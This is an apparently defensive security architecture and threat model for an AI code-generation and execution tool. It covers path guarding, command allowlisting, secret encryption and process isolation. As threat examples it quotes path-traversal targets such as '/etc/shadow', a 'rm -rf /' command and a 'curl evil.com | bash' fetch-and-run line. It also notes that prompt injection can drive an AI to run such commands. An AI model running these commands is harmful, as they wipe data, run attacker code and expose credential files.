# Universal AI App Builder - Security Architecture & Threat Model

## 1. Principles & Threat Model

Universal AI App Builder handles arbitrary code generation and isolated code execution. To prevent host compromise, data exfiltration, or malicious manipulation, strict defense-in-depth policies are implemented at every layer.

---

## 2. Security Safeguards

### A. Path Traversal Guard (`PathGuard`)
- **Threat:** Malicious AI outputs or manipulated requests attempting to overwrite host files (e.g., `../../etc/shadow` or `..\..\Windows\System32`).
- **Mitigation:** Every file path requested for read, write, rename, or delete must strictly resolve to a subpath of the project's designated workspace root directory (`/workspaces/<projectId>`). Null-byte injections and path escapes are rejected with a security error.

### B. Command Allowlisting & Sanitization (`CommandSanitizer`)
- **Threat:** Prompt injection causing AI to execute malicious shell commands (e.g., `rm -rf /`, `curl evil.com | bash`).
- **Mitigation:**
  - Only explicitly allowlisted executables can be invoked: `npm`, `npx`, `node`, `dotnet`, `python`, `pip`, `git`, `docker`, `docker-compose`, `tsc`.
  - Dangerous shell control characters (`;`, `&`, `|`, `` ` ``, `$()`, `>`, `<`) are rejected.
  - Arguments are split and sanitized into structured parameters.

### C. AES-256-GCM Secret Encryption (`SecurityEncryption`)
- **Threat:** AI provider API keys or database passwords leaked in plaintext in database dumps or logs.
- **Mitigation:**
  - All sensitive credentials are encrypted using AES-256-GCM with a 32-byte secret key.
  - Each encrypted record generates a distinct, cryptographically random 16-byte Initialization Vector (IV) and a 16-byte authentication tag.
  - API keys are masked (`sk-...123`) before returning in UI or API responses.

### D. Process Tree Isolation & Port Protection
- **Threat:** Rogue background processes lingering on host or port collisions.
- **Mitigation:**
  - Dedicated dynamic port allocation within range 5100-5999 via TCP socket verification.
  - Process tree kill (`taskkill /t /f /pid` on Windows, `SIGTERM` on Linux) ensures all spawned child processes terminate cleanly when stopping a project.
  - Resource timeouts (default 120s) kill long-running or stalled compilation jobs.
